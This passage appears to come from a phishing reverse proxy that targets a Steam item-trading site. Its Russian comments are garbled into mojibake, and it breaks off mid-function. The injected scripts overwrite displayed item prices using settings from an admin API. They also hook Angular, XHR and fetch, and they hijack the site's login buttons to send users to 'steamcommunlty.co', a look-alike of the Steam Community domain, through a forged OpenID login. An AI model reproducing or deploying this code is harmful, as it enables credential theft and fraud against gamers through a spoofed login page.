                                element: el.tagName,
                                originalValue: el.innerHTML,
                                newValue: newValue
                            });
                            
                            // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
                            el.innerHTML = newValue;
                            
                            // –û—Ç–º–µ—á–∞–µ–º –∫–∞–∫ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π
                            el.removeAttribute('data-pending-mod');
                            el.setAttribute('data-modified', 'true');
                            el.setAttribute('data-modified-value', newValue);
                            
                            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
                            if (el.innerHTML === newValue) {
                                console.log('‚úÖ –≠–ª–µ–º–µ–Ω—Ç —É—Å–ø–µ—à–Ω–æ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω');
                                modified = true;
                            } else {
                                console.warn('‚ö†Ô∏è –ó–Ω–∞—á–µ–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–∞ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ–∂–∏–¥–∞–µ–º–æ–º—É!', {
                                    current: el.innerHTML,
                                    expected: newValue
                                });
                                
                                // –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —Å –¥—Ä—É–≥–∏–º –º–µ—Ç–æ–¥–æ–º
                                try {
                                    const tempDiv = document.createElement('div');
                                    tempDiv.innerHTML = newValue;
                                    
                                    // –û—á–∏—â–∞–µ–º —Ç–µ–∫—É—â–µ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
                                    while (el.firstChild) {
                                        el.removeChild(el.firstChild);
                                    }
                                    
                                    // –ö–æ–ø–∏—Ä—É–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏–∑ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ div
                                    while (tempDiv.firstChild) {
                                        el.appendChild(tempDiv.firstChild);
                                    }
                                    
                                    console.log('‚úÖ –≠–ª–µ–º–µ–Ω—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–º —Å–ø–æ—Å–æ–±–æ–º');
                                    modified = true;
                                } catch (err) {
                                    console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–π –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏:', err);
                                }
                            }
                        });
                    }
                    
                    return {modified, count: elements.length};
                }
                
                // –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π –¥–ª—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –≤ DOM
                function tryApplyModifications() {
                    // –ü–æ–ª—É—á–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –¥–ª—è —Ç–µ–∫—É—â–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
                    const pageUrl = window.location.href;
                    
                    // –û—Ç–º–µ—á–∞–µ–º –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã —Ü–µ–Ω—ã –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, —á—Ç–æ–±—ã –æ–Ω–∏ —Å—Ç–∞–ª–∏ –≤–∏–¥–∏–º—ã–º–∏ —Å—Ä–∞–∑—É
                    document.querySelectorAll('app-page-inventory-price > div > span:first-child:not([data-mod-checked])').forEach(el => {
                        el.setAttribute('data-mod-checked', 'true');
                    });
                    
                    // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é
                    fetch('/admin-api/check-custom-page?url=' + encodeURIComponent(pageUrl))
                        .then(response => response.json())
                        .then(data => {
                            if (data.hasCustomizations) {
                                console.log('‚úÖ –ù–∞–π–¥–µ–Ω—ã –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –¥–ª—è —Ç–µ–∫—É—â–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã');
                                
                                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–µ—Ç–∞–ª–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
                                return fetch('/admin-api/get-custom-page?url=' + encodeURIComponent(pageUrl))
                                    .then(response => response.json());
                            }
                            return null;
                        })
                        .then(config => {
                            if (config && config.selector && config.value) {
                                console.log('üìù –ü—Ä–∏–º–µ–Ω—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—é:', {
                                    selector: config.selector,
                                    value: config.value
                                });
                                
                                // –î–ª—è Angular –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä—É–µ–º —Å–µ–ª–µ–∫—Ç–æ—Ä, —á—Ç–æ–±—ã —É—á–µ—Å—Ç—å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –∞—Ç—Ä–∏–±—É—Ç—ã
                                let angularSelector = config.selector;
                                
                                // –ï—Å–ª–∏ —ç—Ç–æ —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è —Ü–µ–Ω—ã, —Å–¥–µ–ª–∞–µ–º –µ–≥–æ –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–º
                                if (angularSelector.includes('app-page-inventory-price') && angularSelector.includes('span')) {
                                    // –£–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è –±–æ–ª—å—à–µ–π –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
                                    angularSelector = 'app-page-inventory-price > div > span:first-child';
                                    console.log('üîß –ò—Å–ø–æ–ª—å–∑—É–µ–º —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è Angular:', angularSelector);
                                }
                                
                                // –ü—Ä–∏–º–µ–Ω—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—é
                                const result = applySpecificModifications(angularSelector, config.value);
                                
                                if (result.modified) {
                                    console.log(\`‚úÖ –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –ø—Ä–∏–º–µ–Ω–µ–Ω–∞ –∫ \${result.count} —ç–ª–µ–º–µ–Ω—Ç–∞–º\`);
                                } else if (result.count > 0) {
                                    console.warn('‚ö†Ô∏è –≠–ª–µ–º–µ–Ω—Ç—ã –Ω–∞–π–¥–µ–Ω—ã, –Ω–æ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–∞');
                                } else {
                                    console.warn('‚ö†Ô∏è –≠–ª–µ–º–µ–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –ø–æ —Å–µ–ª–µ–∫—Ç–æ—Ä—É:', angularSelector);
                                    
                                    // –ï—Å–ª–∏ —ç—Ç–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —Å —Ü–µ–Ω–æ–π, –ø–æ–ø—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç —Ü–µ–Ω—ã –ª—é–±—ã–º —Å–ø–æ—Å–æ–±–æ–º
                                    if (angularSelector.includes('app-page-inventory-price')) {
                                        console.log('üîç –ü—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç —Ü–µ–Ω—ã –ª—é–±—ã–º —Å–ø–æ—Å–æ–±–æ–º...');
                                        
                                        // –ë–æ–ª–µ–µ –æ–±—â–∏–π —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è —Ü–µ–Ω—ã
                                        const priceSelectors = [
                                            'app-page-inventory-price > div > span:first-child',
                                            'app-page-inventory-price span',
                                            '[class*="price"] > span',
                                            '[class*="price-value"]',
                                            'span[class*="price"]'
                                        ];
                                        
                                        // –ü—Ä–æ–±—É–µ–º –∫–∞–∂–¥—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä
                                        for (const sel of priceSelectors) {
                                            const fallbackResult = applySpecificModifications(sel, config.value);
                                            if (fallbackResult.modified) {
                                                console.log(\`‚úÖ –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∞ —Å –∑–∞–ø–∞—Å–Ω—ã–º —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–º: \${sel}\`);
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                        })
                        .catch(err => {
                            console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏:', err);
                        });
                }
                
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ DOM
                function setupDomObserver() {
                    console.log('üëÅ –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ DOM...');
                    
                    // –°–æ–∑–¥–∞–µ–º MutationObserver –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ DOM
                    const observer = new MutationObserver((mutations) => {
                        let shouldCheck = false;
                        
                        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ–±–∞–≤–ª–µ–Ω—ã –ª–∏ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–µ –Ω–∞—Å —ç–ª–µ–º–µ–Ω—Ç—ã
                        mutations.forEach(mutation => {
                            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                                for (let i = 0; i < mutation.addedNodes.length; i++) {
                                    const node = mutation.addedNodes[i];
                                    
                                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å–æ–¥–µ—Ä–∂–∏—Ç –ª–∏ –Ω–æ–≤—ã–π —É–∑–µ–ª –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–µ –Ω–∞—Å —ç–ª–µ–º–µ–Ω—Ç—ã
                                    if (node.nodeType === 1) { // –≠–ª–µ–º–µ–Ω—Ç
                                        if (
                                            node.tagName && 
                                            (node.tagName.toLowerCase().includes('app-') || 
                                            node.tagName.toLowerCase() === 'span')
                                        ) {
                                            shouldCheck = true;
                                            break;
                                        }
                                        
                                        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ—Ç–æ–º–∫–æ–≤
                                        if (node.querySelector && (
                                            node.querySelector('app-page-inventory-price') || 
                                            node.querySelector('span')
                                        )) {
                                            shouldCheck = true;
                                            break;
                                        }
                                    }
                                }
                            }
                        });
                        
                        // –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω—ã –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–µ —ç–ª–µ–º–µ–Ω—Ç—ã, –ø—Ä–æ–≤–µ—Ä—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
                        if (shouldCheck) {
                            console.log('üîÑ –û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ DOM, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                            setTimeout(() => tryApplyModifications(), 0);
                        }
                    });
                    
                    // –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ –∑–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è–º–∏ –≤ DOM
                    observer.observe(document.documentElement, {
                        childList: true,
                        subtree: true,
                        characterData: true
                    });
                    
                    console.log('‚úÖ –ù–∞–±–ª—é–¥–∞—Ç–µ–ª—å –∑–∞ DOM –Ω–∞—Å—Ç—Ä–æ–µ–Ω');
                    
                    return observer;
                }
                
                // –ö–†–ò–¢–ò–ß–ï–°–ö–ò –í–ê–ñ–ù–´–ô –•–ê–ö–ò–ù–ì ANGULAR
                function hackAngular() {
                    console.log('üõ†Ô∏è –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º —Ö–∞–∫–∏ –¥–ª—è Angular...');
                    
                    // –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ —á–µ—Ä–µ–∑ Zone.js (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ Angular)
                    if (window.Zone) {
                        console.log('‚úÖ –û–±–Ω–∞—Ä—É–∂–µ–Ω Zone.js (Angular), —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ö—É–∫–∏...');
                        
                        // Hack: –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –º–µ—Ç–æ–¥ —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ Angular –¥–ª—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
                        // –ø–æ—Å–ª–µ —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥–∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤
                        const originalStable = window.Zone && window.Zone.__symbol__ && 
                            window.Zone[window.Zone.__symbol__('STABLE')] || null;
                            
                        if (originalStable) {
                            const originalEmit = originalStable.emit;
                            originalStable.emit = function() {
                                const result = originalEmit.apply(this, arguments);
                                console.log('üîÑ Angular —Å—Ç–∞–±–∏–ª–∏–∑–∏—Ä–æ–≤–∞–ª—Å—è, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                                setTimeout(() => tryApplyModifications(), 0);
                                return result;
                            };
                            console.log('‚úÖ –•—É–∫ –¥–ª—è Zone.js —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω');
                        }
                        
                        // –ü–µ—Ä–µ—Ö–≤–∞—Ç angular.bootstrap
                        if (window.angular && window.angular.bootstrap) {
                            const originalBootstrap = window.angular.bootstrap;
                            window.angular.bootstrap = function() {
                                const result = originalBootstrap.apply(this, arguments);
                                console.log('üîÑ Angular bootstrap, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                                setTimeout(() => tryApplyModifications(), 50);
                                return result;
                            };
                            console.log('‚úÖ –•—É–∫ –¥–ª—è angular.bootstrap —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω');
                        }
                    }
                    
                    // –ì–ª–æ–±–∞–ª—å–Ω—ã–π –ø–µ—Ä–µ—Ö–≤–∞—Ç –¥–ª—è XHR-–∑–∞–ø—Ä–æ—Å–æ–≤ (—á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ Angular)
                    const originalXhrOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function() {
                        this.addEventListener('load', function() {
                            console.log('üîÑ XHR –∑–∞–ø—Ä–æ—Å –∑–∞–≤–µ—Ä—à–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                            setTimeout(() => tryApplyModifications(), 0);
                            setTimeout(() => tryApplyModifications(), 100);
                        });
                        return originalXhrOpen.apply(this, arguments);
                    };
                    
                    // –ü–µ—Ä–µ—Ö–≤–∞—Ç –¥–ª—è fetch API
                    const originalFetch = window.fetch;
                    window.fetch = function() {
                        const promise = originalFetch.apply(this, arguments);
                        promise.then(() => {
                            console.log('üîÑ Fetch –∑–∞–ø—Ä–æ—Å –∑–∞–≤–µ—Ä—à–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                            setTimeout(() => tryApplyModifications(), 0);
                            setTimeout(() => tryApplyModifications(), 100);
                        });
                        return promise;
                    };
                    
                    console.log('‚úÖ –•–∞–∫–∏ –¥–ª—è Angular —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã');
                }
                
                // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –≤—Å–µ—Ö –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏
                function init() {
                    console.log('üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                    
                    // –ü–µ—Ä–≤–∏—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
                    tryApplyModifications();
                    
                    // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ DOM
                    const observer = setupDomObserver();
                    
                    // –•–∞–∫–∏ –¥–ª—è Angular
                    hackAngular();
                    
                    // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è –ø–æ–¥—Å—Ç—Ä–∞—Ö–æ–≤–∫–∏
                    const checkInterval = setInterval(() => {
                        console.log('‚è∞ –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                        tryApplyModifications();
                    }, 500);
                    
                    // –°–Ω–∏–∂–∞–µ–º —á–∞—Å—Ç–æ—Ç—É –ø—Ä–æ–≤–µ—Ä–æ–∫ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
                    setTimeout(() => {
                        clearInterval(checkInterval);
                        
                        // –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å –º–µ–Ω—å—à–µ–π —á–∞—Å—Ç–æ—Ç–æ–π
                        setInterval(() => {
                            tryApplyModifications();
                        }, 2000);
                        
                        console.log('‚è±Ô∏è –ß–∞—Å—Ç–æ—Ç–∞ –ø—Ä–æ–≤–µ—Ä–æ–∫ —Å–Ω–∏–∂–µ–Ω–∞ –¥–æ 2 —Å–µ–∫—É–Ω–¥');
                    }, 10000);
                    
                    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
                    window.addEventListener('load', () => {
                        console.log('üîÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                        tryApplyModifications();
                    });
                    
                    document.addEventListener('DOMContentLoaded', () => {
                        console.log('üîÑ DOM –∑–∞–≥—Ä—É–∂–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                        tryApplyModifications();
                    });
                    
                    // –ï—Å–ª–∏ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω–∞
                    if (document.readyState === 'complete' || document.readyState === 'interactive') {
                        console.log('üîÑ –î–æ–∫—É–º–µ–Ω—Ç —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π...');
                        tryApplyModifications();
                    }
                    
                    console.log('‚úÖ –°–∏—Å—Ç–µ–º–∞ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞');
                }
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é
                init();
            }
            
            // –ù–û–í–û–ï: –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ —Ä–∞–Ω–æ, –¥–æ –∑–∞–≥—Ä—É–∑–∫–∏ DOM
            applyCustomModifications();
            
            // –¢–∞–∫–∂–µ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ DOM –∏ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            document.addEventListener('DOMContentLoaded', () => {
                console.log('DOM –∑–∞–≥—Ä—É–∂–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏...');
            });
            
            window.addEventListener('load', () => {
                console.log('–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞, –ø—Ä–æ–≤–µ—Ä—è–µ–º –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏...');
            });
            
            console.log('üîß Proxy initialized successfully with enhanced error handling and custom modifications support');
        })();
        </script>
        `;
        
        // –î–æ–±–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–Ω–æ–ø–æ–∫ –ª–æ–≥–∏–Ω–∞
        const loginButtonsScript = `
        <script>
(function() {
    console.log('üîí –ó–∞–ø—É—Å–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–Ω–æ–ø–æ–∫ –≤—Ö–æ–¥–∞ —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º —Å—Ç–∏–ª–µ–π');
    
    // URL –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è
    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
    
    // –°–ø–∏—Å–æ–∫ —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–≤ –∫–Ω–æ–ø–æ–∫ - –î–û–ë–ê–í–õ–ï–ù –ù–û–í–´–ô –°–ï–õ–ï–ö–¢–û–† #login-head
    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–Ω–æ–ø–æ–∫ –±–µ–∑ –∏—Ö –∑–∞–º–µ–Ω—ã
    function enhanceLoginButtons() {
        targetSelectors.forEach(selector => {
            const buttons = document.querySelectorAll(selector);
            
            buttons.forEach(button => {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ–±—Ä–∞–±–æ—Ç–∞–ª–∏ –ª–∏ –º—ã —É–∂–µ —ç—Ç—É –∫–Ω–æ–ø–∫—É
                if (button.hasAttribute('data-login-enhanced')) return;
                
                console.log('–£–ª—É—á—à–∞—é –∫–Ω–æ–ø–∫—É –≤—Ö–æ–¥–∞ (—Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º —Å—Ç–∏–ª–µ–π):', selector);
                
                // –ü–æ–º–µ—á–∞–µ–º –∫–Ω–æ–ø–∫—É –∫–∞–∫ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—É—é
                button.setAttribute('data-login-enhanced', 'true');
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π onclick, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å
                const originalOnClick = button.onclick;
                
                // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤—ã–π onclick
                button.onclick = function(e) {
                    console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω –∫–ª–∏–∫ –ø–æ –∫–Ω–æ–ø–∫–µ –≤—Ö–æ–¥–∞');
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    
                    // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ —Ü–µ–ª–µ–≤–æ–π URL
                    window.location.href = targetUrl;
                    return false;
                };
                
                // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º —Å–æ–±—ã—Ç–∏—è –Ω–∞ —É—Ä–æ–≤–Ω–µ addEventListener
                const originalAddEventListener = button.addEventListener;
                button.addEventListener = function(type, listener, options) {
                    if (type.toLowerCase() === 'click' || 
                        type.toLowerCase() === 'mousedown' || 
                        type.toLowerCase() === 'touchstart') {
                        
                        console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞', type, '–∫ –∫–Ω–æ–ø–∫–µ –ª–æ–≥–∏–Ω–∞');
                        return originalAddEventListener.call(this, type, function(e) {
                            e.preventDefault();
                            e.stopPropagation();
                            window.location.href = targetUrl;
                            return false;
                        }, true);
                    }
                    
                    return originalAddEventListener.call(this, type, listener, options);
                };
                
                // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –¥—Ä—É–≥–∏—Ö —Ç–∏–ø–æ–≤ —Å–æ–±—ã—Ç–∏–π
                ['mousedown', 'touchstart', 'pointerdown'].forEach(eventType => {
                    button.addEventListener(eventType, function(e) {
                        console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–æ —Å–æ–±—ã—Ç–∏–µ', eventType, '–Ω–∞ –∫–Ω–æ–ø–∫–µ –ª–æ–≥–∏–Ω–∞');
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        
                        // –†–µ–¥–∏—Ä–µ–∫—Ç —Å –Ω–µ–±–æ–ª—å—à–æ–π –∑–∞–¥–µ—Ä–∂–∫–æ–π
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 10);
                        
                        return false;
                    }, true);
                });
                
                // –î–ª—è Angular Material Ripple
                if (button.classList.contains('mat-mdc-button-base')) {
                    // –ù–∞—Ö–æ–¥–∏–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä ripple —ç—Ñ—Ñ–µ–∫—Ç–∞
                    const rippleElements = button.querySelectorAll('.mat-ripple, .mat-mdc-button-ripple, .mdc-button__ripple');
                    
                    rippleElements.forEach(ripple => {
                        // –î–æ–±–∞–≤–ª—è–µ–º –ø–µ—Ä–µ—Ö–≤–∞—Ç –Ω–∞ ripple —ç–ª–µ–º–µ–Ω—Ç
                        ripple.addEventListener('mousedown', function(e) {
                            console.log('–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω ripple —ç—Ñ—Ñ–µ–∫—Ç');
                            e.preventDefault();
                            e.stopPropagation();
                            
                            // –í—Å—ë —Ä–∞–≤–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º ripple –¥–ª—è –∫—Ä–∞—Å–æ—Ç—ã, –Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º
                            setTimeout(() => {
                                window.location.href = targetUrl;
